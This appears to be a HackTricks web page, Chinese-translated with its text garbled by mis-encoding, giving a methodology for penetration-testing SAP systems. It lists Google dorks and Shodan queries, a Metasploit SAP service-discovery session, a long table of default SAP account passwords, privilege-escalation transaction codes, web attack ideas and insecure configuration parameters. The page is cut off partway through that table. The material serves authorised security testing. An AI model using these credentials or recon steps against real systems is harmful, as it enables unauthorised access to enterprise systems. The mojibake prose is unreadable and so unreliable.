<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Pentesting SAP</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨ Twitter ä¸Šå…³æ³¨</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<h1 id="å…³äº-sap-çš„ä»‹ç»"><a class="header" href="#å…³äº-sap-çš„ä»‹ç»">å…³äº SAP çš„ä»‹ç»</a></h1>
<p>SAP ä»£è¡¨æ•°æ®å¤„ç†ä¸­çš„ç³»ç»Ÿåº”ç”¨å’Œäº§å“ã€‚æ ¹æ®å®šä¹‰ï¼ŒSAP ä¹Ÿæ˜¯ ERPï¼ˆä¼ä¸šèµ„æºè§„åˆ’ï¼‰è½¯ä»¶çš„åç§°ï¼Œä»¥åŠå…¬å¸çš„åç§°ã€‚
SAP ç³»ç»Ÿç”±å¤šä¸ªå®Œå…¨é›†æˆçš„æ¨¡å—ç»„æˆï¼Œå‡ ä¹æ¶µç›–äº†ä¸šåŠ¡ç®¡ç†çš„æ¯ä¸ªæ–¹é¢ã€‚</p>
<p>æ¯ä¸ª SAP å®ä¾‹ï¼ˆæˆ– SIDï¼‰ç”±ä¸‰å±‚ç»„æˆï¼šæ•°æ®åº“ã€åº”ç”¨ç¨‹åºå’Œæ¼”ç¤ºï¼Œæ¯ä¸ªç¯å¢ƒé€šå¸¸ç”±å››ä¸ªå®ä¾‹ç»„æˆï¼šå¼€å‘ã€æµ‹è¯•ã€è´¨é‡ä¿è¯å’Œç”Ÿäº§ã€‚
æ¯ä¸€å±‚åœ¨æŸç§ç¨‹åº¦ä¸Šéƒ½å¯ä»¥è¢«åˆ©ç”¨ï¼Œä½†é€šè¿‡ <strong>æ”»å‡»æ•°æ®åº“</strong> å¯ä»¥è·å¾—æœ€å¤§çš„æ•ˆæœã€‚</p>
<p>æ¯ä¸ª SAP å®ä¾‹è¢«åˆ’åˆ†ä¸ºå¤šä¸ªå®¢æˆ·ç«¯ã€‚æ¯ä¸ªå®¢æˆ·ç«¯éƒ½æœ‰ä¸€ä¸ªç”¨æˆ· SAP*ï¼Œè¿™æ˜¯åº”ç”¨ç¨‹åºçš„â€œæ ¹â€ç›¸å½“äºã€‚
åœ¨åˆå§‹åˆ›å»ºæ—¶ï¼Œè¿™ä¸ªç”¨æˆ· SAP* è·å¾—ä¸€ä¸ªé»˜è®¤å¯†ç ï¼šâ€œ060719992â€ï¼ˆæ›´å¤šé»˜è®¤å¯†ç è§ä¸‹æ–‡ï¼‰ã€‚
å¦‚æœä½ çŸ¥é“è¿™äº› <strong>å¯†ç åœ¨æµ‹è¯•æˆ–å¼€å‘ç¯å¢ƒä¸­å¹¶ä¸å¸¸æ›´æ”¹</strong>ï¼Œä½ ä¼šæ„Ÿåˆ°æƒŠè®¶ï¼</p>
<p>å°è¯•ä½¿ç”¨ç”¨æˆ·å &lt;SID&gt;adm è·å–ä»»ä½•æœåŠ¡å™¨çš„ shell è®¿é—®æƒé™ã€‚
æš´åŠ›ç ´è§£å¯èƒ½æœ‰å¸®åŠ©ï¼Œä½†å¯èƒ½ä¼šæœ‰è´¦æˆ·é”å®šæœºåˆ¶ã€‚</p>
<h1 id="å‘ç°"><a class="header" href="#å‘ç°">å‘ç°</a></h1>
<blockquote>
<p>ä¸‹ä¸€éƒ¨åˆ†ä¸»è¦æ¥è‡ª <a href="https://github.com/shipcod3/mySapAdventures">https://github.com/shipcod3/mySapAdventures</a> çš„ç”¨æˆ· shipcod3ï¼</p>
</blockquote>
<ul>
<li>æ£€æŸ¥åº”ç”¨ç¨‹åºèŒƒå›´æˆ–æµ‹è¯•çš„ç¨‹åºç®€è¦ã€‚æ³¨æ„è¿æ¥åˆ° SAP GUI çš„ä¸»æœºåæˆ–ç³»ç»Ÿå®ä¾‹ã€‚</li>
<li>ä½¿ç”¨ OSINTï¼ˆå¼€æºæƒ…æŠ¥ï¼‰ã€Shodan å’Œ Google Dorks æ£€æŸ¥æ–‡ä»¶ã€å­åŸŸå’Œæœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œå¦‚æœåº”ç”¨ç¨‹åºæ˜¯é¢å‘äº’è”ç½‘æˆ–å…¬å¼€çš„ï¼š</li>
</ul>
<pre><code class="language-text">inurl:50000/irj/portal
inurl:IciEventService/IciEventConf
inurl:/wsnavigator/jsps/test.jsp
inurl:/irj/go/km/docs/
https://www.shodan.io/search?query=sap+portal
https://www.shodan.io/search?query=SAP+Netweaver
https://www.shodan.io/search?query=SAP+J2EE+Engine
</code></pre>
<ul>
<li>è¿™é‡Œæ˜¯ <a href="http://sap:50000/irj/portal">http://SAP:50000/irj/portal</a> çš„æ ·å­</li>
</ul>
<p><img src="https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap%20logon.jpeg" alt="SAP ç™»å½•ç•Œé¢" /></p>
<ul>
<li>ä½¿ç”¨ nmap æ£€æŸ¥å¼€æ”¾ç«¯å£å’Œå·²çŸ¥æœåŠ¡ï¼ˆsap è·¯ç”±å™¨ã€webdnyproã€web æœåŠ¡ã€web æœåŠ¡å™¨ç­‰ï¼‰ã€‚</li>
<li>å¦‚æœæœ‰è¿è¡Œçš„ web æœåŠ¡å™¨ï¼Œçˆ¬å– URLã€‚</li>
<li>å¦‚æœåœ¨æŸäº›ç«¯å£ä¸Šæœ‰ web æœåŠ¡å™¨ï¼Œè¯·æ¨¡ç³Šæµ‹è¯•ç›®å½•ï¼ˆå¯ä»¥ä½¿ç”¨ Burp Intruderï¼‰ã€‚ä»¥ä¸‹æ˜¯ SecLists é¡¹ç›®æä¾›çš„ä¸€äº›ä¼˜ç§€å­—å…¸ï¼Œç”¨äºæŸ¥æ‰¾é»˜è®¤ SAP ICM è·¯å¾„å’Œå…¶ä»–æœ‰è¶£çš„ç›®å½•æˆ–æ–‡ä»¶ï¼š</li>
</ul>
<p><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-SAP.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls_SAP.txt</a><br />
<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt</a><br />
<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt</a></p>
<ul>
<li>ä½¿ç”¨ SAP SERVICE DISCOVERY è¾…åŠ© Metasploit æ¨¡å—æšä¸¾ SAP å®ä¾‹/æœåŠ¡/ç»„ä»¶ï¼š</li>
</ul>
<pre><code class="language-text">msf &gt; use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) &gt; show options
Module options (auxiliary/scanner/sap/sap_service_discovery):
Name         Current Setting  Required  Description
----         ---------------  --------  -----------
CONCURRENCY  10               yes       The number of concurrent ports to check per host
INSTANCES    00-01            yes       Instance numbers to scan (e.g. 00-05,00-99)
RHOSTS                        yes       The target address range or CIDR identifier
THREADS      1                yes       The number of concurrent threads
TIMEOUT      1000             yes       The socket connect timeout in milliseconds
msf auxiliary(sap_service_discovery) &gt; set rhosts 192.168.96.101
rhosts =&gt; 192.168.96.101
msf auxiliary(sap_service_discovery) &gt; run
[*] 192.168.96.101:       - [SAP] Beginning service Discovery '192.168.96.101'
</code></pre>
<h2 id="æµ‹è¯•åšå®¢æˆ·ç«¯--sap-gui"><a class="header" href="#æµ‹è¯•åšå®¢æˆ·ç«¯--sap-gui">æµ‹è¯•åšå®¢æˆ·ç«¯ / SAP GUI</a></h2>
<p>è¿™æ˜¯è¿æ¥åˆ° SAP GUI çš„å‘½ä»¤<br />
<code>sapgui &lt;sap server hostname&gt; &lt;system number&gt;</code></p>
<ul>
<li>æ£€æŸ¥é»˜è®¤å‡­æ® (åœ¨ Bugcrowd çš„æ¼æ´è¯„çº§åˆ†ç±»ä¸­ï¼Œè¿™è¢«è§†ä¸º P1 -&gt; æœåŠ¡å™¨å®‰å…¨é…ç½®é”™è¯¯ | ä½¿ç”¨é»˜è®¤å‡­æ® | ç”Ÿäº§æœåŠ¡å™¨):</li>
</ul>
<pre><code class="language-text"># SAP* - High privileges - Hardcoded kernel user
SAP*:06071992:*
SAP*:PASS:*
# IDEADM - High Privileges - Only in IDES systems
IDEADM:admin:*
# DDIC - High privileges - User has SAP_ALL
DDIC:19920706:000,001
# EARLYWATCH - High privileges
EARLYWATCH:SUPPORT:066
# TMSADM - Medium privileges
TMSADM:PASSWORD:000
TMSADM:$1Pawd2&amp;:000
# SAPCPIC - Medium privileges
SAPCPIC:ADMIN:000,001
# SOLMAN dialog default users and passwords.
# For more info check:
# https://www.troopers.de/media/filer_public/37/34/3734ebb3-989c-4750-9d48-ea478674991a/an_easy_way_into_your_sap_systems_v30.pdf
# https://launchpad.support.sap.com/#/notes/2293011
# SOLMAN_ADMIN - High privileges - Only on SOLMAN systems
SOLMAN_ADMIN:init1234:*
# SAPSUPPORT - High privileges - Only on SOLMAN or satellite systems
SAPSUPPORT:init1234:*
# SOLMAN&lt;SID&gt;&lt;CLNT&gt; - High privileges - Only on SOLMAN systems
#SOLMAN&lt;SID&gt;&lt;CLNT&gt;:init1234:*
# Trial systems
# -------------
# AS ABAP 7.40 SP08 Developer Edition:
# https://blogs.sap.com/2015/10/14/sap-netweaver-as-abap-740-sp8-developer-edition-to-download-consise-installation-instruction/
DDIC:DidNPLpw2014:001
SAP*:DidNPLpw2014:001
DEVELOPER:abCd1234:001
BWDEVELOPER:abCd1234:001
# AS ABAP 7.50 SP02 Developer Edition:
# https://blogs.sap.com/2016/11/03/sap-nw-as-abap-7.50-sp2-developer-edition-to-download-consise-installation-guide/
# AS ABAP 7.51 SP02 Developer Edition:
# https://blogs.sap.com/2017/09/04/sap-as-abap-7.51-sp2-developer-edition-to-download-concise-installation-guide/
DDIC:Appl1ance:000,001
SAP*:Appl1ance:000,001
DEVELOPER:Appl1ance:001
BWDEVELOPER:Appl1ance:001
# AS ABAP 7.51 SP01 Developer Edition:
# https://blogs.sap.com/2018/09/13/as-abap-7.52-sp01-developer-edition-concise-installation-guide/
# AS ABAP 7.52 SP04 Developer Edition:
# https://blogs.sap.com/2019/10/01/as-abap-7.52-sp04-developer-edition-concise-installation-guide/
DDIC:Down1oad:000,001
SAP*:Down1oad:000,001
DEVELOPER:Down1oad:001
BWDEVELOPER:Down1oad:001
</code></pre>
<ul>
<li>è¿è¡Œ Wiresharkï¼Œç„¶åä½¿ç”¨æ‚¨è·å¾—çš„å‡­æ®å¯¹å®¢æˆ·ç«¯ï¼ˆSAP GUIï¼‰è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå› ä¸ºæŸäº›å®¢æˆ·ç«¯åœ¨æ²¡æœ‰ SSL çš„æƒ…å†µä¸‹ä¼ è¾“å‡­æ®ã€‚æœ‰ä¸¤ä¸ªå·²çŸ¥çš„ Wireshark æ’ä»¶å¯ä»¥è§£æ SAP DIAG åè®®ä½¿ç”¨çš„ä¸»è¦å¤´éƒ¨ï¼šSecureAuth Labs SAP è§£ææ’ä»¶å’Œ Positive Research Center çš„ SAP DIAG æ’ä»¶ã€‚</li>
<li>æ£€æŸ¥ç‰¹æƒå‡çº§ï¼Œä¾‹å¦‚ä½¿ç”¨æŸäº› SAP äº‹åŠ¡ä»£ç ï¼ˆtcodesï¼‰å¯¹ä½æƒé™ç”¨æˆ·è¿›è¡Œæ“ä½œï¼š</li>
<li>SU01 - åˆ›å»ºå’Œç»´æŠ¤ç”¨æˆ·</li>
<li>SU01D - æ˜¾ç¤ºç”¨æˆ·</li>
<li>SU10 - æ‰¹é‡ç»´æŠ¤</li>
<li>SU02 - æ‰‹åŠ¨åˆ›å»ºé…ç½®æ–‡ä»¶</li>
<li>SM19 - å®‰å…¨å®¡è®¡ - é…ç½®</li>
<li>SE84 - SAP R/3 æˆæƒçš„ä¿¡æ¯ç³»ç»Ÿ</li>
<li>æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥åœ¨å®¢æˆ·ç«¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤/è¿è¡Œè„šæœ¬ã€‚</li>
<li>æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥åœ¨ BAPI Explorer ä¸Šè¿›è¡Œ XSS</li>
</ul>
<h1 id="æµ‹è¯•-web-ç•Œé¢"><a class="header" href="#æµ‹è¯•-web-ç•Œé¢">æµ‹è¯• Web ç•Œé¢</a></h1>
<ul>
<li>çˆ¬å– URLï¼ˆå‚è§å‘ç°é˜¶æ®µï¼‰ã€‚</li>
<li>åƒåœ¨å‘ç°é˜¶æ®µä¸€æ ·æ¨¡ç³Šæµ‹è¯• URLã€‚ä»¥ä¸‹æ˜¯ <a href="http://sap:50000/index.html">http://SAP:50000/index.html</a> çš„æ ·å­ï¼š</li>
</ul>
<p><img src="https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/index.jpeg" alt="SAP Index Page" /></p>
<ul>
<li>æŸ¥æ‰¾å¸¸è§çš„ Web æ¼æ´ï¼ˆå‚è€ƒ OWASP Top 10ï¼‰ï¼Œå› ä¸ºæŸäº›åœ°æ–¹å­˜åœ¨ XSSã€RCEã€XXE ç­‰æ¼æ´ã€‚</li>
<li>æŸ¥çœ‹ Jason Haddix çš„ <a href="https://github.com/jhaddix/tbhm">â€œThe Bug Hunters Methodologyâ€</a> ä»¥æµ‹è¯• Web æ¼æ´ã€‚</li>
<li>é€šè¿‡åŠ¨è¯ç¯¡æ”¹è¿›è¡Œèº«ä»½éªŒè¯ç»•è¿‡ï¼Ÿä¹Ÿè®¸ :)</li>
<li>æ‰“å¼€ <code>http://SAP:50000/webdynpro/resources/sap.com/XXX/JWFTestAddAssignees#</code>ï¼Œç„¶åç‚¹å‡»â€œé€‰æ‹©â€æŒ‰é’®ï¼Œåœ¨æ‰“å¼€çš„çª—å£ä¸­æŒ‰â€œæœç´¢â€ã€‚æ‚¨åº”è¯¥èƒ½å¤Ÿçœ‹åˆ° SAP ç”¨æˆ·çš„åˆ—è¡¨ï¼ˆæ¼æ´å‚è€ƒï¼š<a href="https://erpscan.com/advisories/erpscan-16-010-sap-netweaver-7-4-information-disclosure/">ERPSCAN-16-010</a>ï¼‰</li>
<li>å‡­æ®æ˜¯é€šè¿‡ HTTP æäº¤çš„å—ï¼Ÿå¦‚æœæ˜¯ï¼Œåˆ™æ ¹æ® Bugcrowd çš„ <a href="https://bugcrowd.com/vulnerability-rating-taxonomy">æ¼æ´è¯„çº§åˆ†ç±»æ³•</a> è¢«è§†ä¸º P3ï¼šç ´åçš„èº«ä»½éªŒè¯å’Œä¼šè¯ç®¡ç† | é€šè¿‡ HTTP çš„å¼±ç™»å½•åŠŸèƒ½ã€‚æç¤ºï¼šä¹Ÿæ£€æŸ¥ <a href="http://sap:50000/startPage">http://SAP:50000/startPage</a> æˆ–ç™»å½•é—¨æˆ· :)</li>
</ul>
<p><img src="https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/startPage.jpeg" alt="SAP Start Page" /></p>
<ul>
<li>å°è¯• <code>/irj/go/km/navigation/</code> ä»¥è·å–å¯èƒ½çš„ç›®å½•åˆ—è¡¨æˆ–èº«ä»½éªŒè¯ç»•è¿‡</li>
<li><a href="http://sap/sap/public/info">http://SAP/sap/public/info</a> åŒ…å«ä¸€äº›æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼š</li>
</ul>
<pre><code class="language-xml">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"&gt;
&lt;SOAP-ENV:Body&gt;
&lt;rfc:RFC_SYSTEM_INFO.Response xmlns:rfc="urn:sap-com:document:sap:rfc:functions"&gt;
&lt;RFCSI&gt;
&lt;RFCPROTO&gt;011&lt;/RFCPROTO&gt;
&lt;RFCCHARTYP&gt;4102&lt;/RFCCHARTYP&gt;
&lt;RFCINTTYP&gt;BIG&lt;/RFCINTTYP&gt;
&lt;RFCFLOTYP&gt;IE3&lt;/RFCFLOTYP&gt;
&lt;RFCDEST&gt;randomnum&lt;/RFCDEST&gt;
&lt;RFCHOST&gt;randomnum&lt;/RFCHOST&gt;
&lt;RFCSYSID&gt;BRQ&lt;/RFCSYSID&gt;
&lt;RFCDATABS&gt;BRQ&lt;/RFCDATABS&gt;
&lt;RFCDBHOST&gt;randomnum&lt;/RFCDBHOST&gt;
&lt;RFCDBSYS&gt;ORACLE&lt;/RFCDBSYS&gt;
&lt;RFCSAPRL&gt;740&lt;/RFCSAPRL&gt;
&lt;RFCMACH&gt;324&lt;/RFCMACH&gt;
&lt;RFCOPSYS&gt;AIX&lt;/RFCOPSYS&gt;
&lt;RFCTZONE&gt;-25200&lt;/RFCTZONE&gt;
&lt;RFCDAYST/&gt;
&lt;RFCIPADDR&gt;192.168.1.8&lt;/RFCIPADDR&gt;
&lt;RFCKERNRL&gt;749&lt;/RFCKERNRL&gt;
&lt;RFCHOST2&gt;randomnum&lt;/RFCHOST2&gt;
&lt;RFCSI_RESV/&gt;
&lt;RFCIPV6ADDR&gt;192.168.1.8&lt;/RFCIPV6ADDR&gt;
&lt;/RFCSI&gt;
&lt;/rfc:RFC_SYSTEM_INFO.Response&gt;
&lt;/SOAP-ENV:Body&gt;
&lt;/SOAP-ENV:Envelope&gt;
</code></pre>
<h1 id="é…ç½®å‚æ•°"><a class="header" href="#é…ç½®å‚æ•°">é…ç½®å‚æ•°</a></h1>
<p>å¦‚æœæ‚¨åœ¨æ¸—é€æµ‹è¯•æœŸé—´æ‹¥æœ‰æ­£ç¡®çš„ç™»å½•è¯¦ç»†ä¿¡æ¯ï¼Œæˆ–è€…æ‚¨å·²æˆåŠŸä½¿ç”¨åŸºæœ¬å‡­æ®ç™»å½•åˆ° SAP GUIï¼Œæ‚¨å¯ä»¥æ£€æŸ¥å‚æ•°å€¼ã€‚è®¸å¤šåŸºæœ¬å’Œè‡ªå®šä¹‰é…ç½®å‚æ•°å€¼è¢«è§†ä¸ºæ¼æ´ã€‚</p>
<p>æ‚¨å¯ä»¥æ‰‹åŠ¨å’Œè‡ªåŠ¨æ£€æŸ¥å‚æ•°å€¼ï¼Œä½¿ç”¨è„šæœ¬ï¼ˆä¾‹å¦‚ <a href="https://github.com/damianStrojek/SAPPV">SAP Parameter Validator</a>ï¼‰ã€‚</p>
<h2 id="æ‰‹åŠ¨å‚æ•°æ£€æŸ¥"><a class="header" href="#æ‰‹åŠ¨å‚æ•°æ£€æŸ¥">æ‰‹åŠ¨å‚æ•°æ£€æŸ¥</a></h2>
<p>é€šè¿‡å¯¼èˆªåˆ°äº‹åŠ¡ä»£ç  <code>RSPFPAR</code>ï¼Œæ‚¨å¯ä»¥æŸ¥è¯¢ä¸åŒçš„å‚æ•°å¹¶æŸ¥æ‰¾å…¶å€¼ã€‚</p>
<p>ä¸‹è¡¨åŒ…å«å·²å®šä¹‰çš„å‚æ•°åŠå…¶åŒºåˆ†æ¡ä»¶ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœ <i>gw/reg_no_conn_info</i> è®¾ç½®ä¸ºå°äº 255 (<code>&lt;255</code>)ï¼Œåˆ™åº”è§†ä¸ºå¨èƒã€‚åŒæ ·ï¼Œå¦‚æœ <i>icm/security_log</i> ç­‰äºäºŒ (<code>2</code>)ï¼Œå®ƒä¹Ÿå°†æ˜¯ä¸€ä¸ªå¯èƒ½çš„å¨èƒã€‚</p>
<div class="table-wrapper"><table><thead><tr><th>å‚æ•°</th><th>çº¦æŸ</th><th>æè¿°</th></tr></thead><tbody>
<tr><td><code>auth/object_disabling_active</code></td><td><code>Y</code></td><td>æŒ‡ç¤ºå¯¹è±¡ç¦ç”¨æ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€ã€‚</td></tr>
<tr><td><code>auth/rfc_authority_check</code></td><td><code>&lt;2</code></td><td>è®¾ç½® RFC çš„æƒé™æ£€æŸ¥çº§åˆ«ã€‚</td></tr>
<tr><td><code>auth/no_check_in_some_cases</code></td><td><code>Y</code></td><td>æŒ‡å®šåœ¨æŸäº›æƒ…å†µä¸‹æ˜¯å¦ç»•è¿‡æ£€æŸ¥ã€‚</td></tr>
<tr><td><code>bdc/bdel_auth_check</code></td><td><code>FALSE</code></td><td>ç¡®å®š BDC ä¸­æ˜¯å¦å¼ºåˆ¶æ‰§è¡Œæˆæƒæ£€æŸ¥ã€‚</td></tr>
<tr><td><code>gw/reg_no_conn_info</code></td><td><code>&lt;255</code></td><td>é™åˆ¶æ³¨å†Œå·è¿æ¥ä¿¡æ¯çš„å­—ç¬¦æ•°ã€‚</td></tr>
<tr><td><code>icm/security_log</code></td><td><code>2</code></td><td>å®šä¹‰ ICMï¼ˆäº’è”ç½‘é€šä¿¡ç®¡ç†å™¨ï¼‰çš„å®‰å…¨æ—¥å¿—çº§åˆ«ã€‚</td></tr>
<tr><td><code>icm/server_port_0</code></td><td><code>Display</code></td><td>æŒ‡å®š ICM çš„æœåŠ¡å™¨ç«¯å£ï¼ˆç«¯å£ 0ï¼‰ã€‚</td></tr>
<tr><td><code>icm/server_port_1</code></td><td><code>Display</code></td><td>æŒ‡å®š ICM çš„æœåŠ¡å™¨ç«¯å£ï¼ˆç«¯å£ 1ï¼‰ã€‚</td></tr>
<tr><td><code>icm/server_port_2</code></td><td><code>Display</code></td><td>æŒ‡å®š ICM çš„æœåŠ¡å™¨ç«¯å£ï¼ˆç«¯å£ 2ï¼‰ã€‚</td></tr>
<tr><td><code>login/password_compliance_to_current_policy</code></td><td><code>0</code></td><td>å¼ºåˆ¶å¯†ç ç¬¦åˆå½“å‰æ”¿ç­–ã€‚</td></tr>
<tr><td><code>login/no_automatic_user_sapstar</code></td><td><code>0</code></td><td>ç¦ç”¨è‡ªåŠ¨ç”¨æˆ· SAPSTAR åˆ†é…ã€‚</td></tr>
<tr><td><code>login/min_password_specials</code></td><td><code>0</code></td><td>å¯†ç ä¸­è¦æ±‚çš„ç‰¹æ®Šå­—ç¬¦çš„æœ€å°æ•°é‡ã€‚</td></tr>
<tr><td><code>login/min_password_lng</code></td><td><code>&lt;8</code></td><td>å¯†ç è¦æ±‚çš„æœ€å°é•¿åº¦ã€‚</td></tr>
<tr><td><code>login/min_password_lowercase</code></td><td><code>0</code></td><td>å¯†ç ä¸­è¦æ±‚çš„å°å†™å­—æ¯çš„æœ€å°æ•°é‡ã€‚</td></tr>
<tr><td><code>login/min_password_uppercase</code></td><td><code>0</code></td><td>å¯†ç ä¸­è¦æ±‚çš„å¤§å†™å­—æ¯çš„æœ€å°æ•°é‡ã€‚</td></tr>
<tr><td><code>login/min_password_digits</code></td><td><code>0</code></td><td>å¯†ç ä¸­è¦æ±‚çš„æ•°å­—çš„æœ€å°æ•°é‡ã€‚</td></tr>
